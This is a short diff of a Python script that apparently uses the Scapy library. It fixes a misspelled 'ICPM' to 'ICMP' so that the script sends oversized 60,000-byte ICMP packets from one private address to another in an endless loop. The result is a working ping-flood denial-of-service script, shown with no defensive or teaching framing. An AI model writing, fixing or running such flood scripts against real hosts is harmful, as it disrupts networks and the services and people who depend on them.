@@ -7,6 +7,6 @@ print "-"*60
 
 
 ip1 = IP(src="10.133.1.181",dst="10.133.1.153")
-packet = ip1/ICPM()/("m"*60000)
+packet = ip1/ICMP()/("m"*60000)
 while True:
   send(packet)
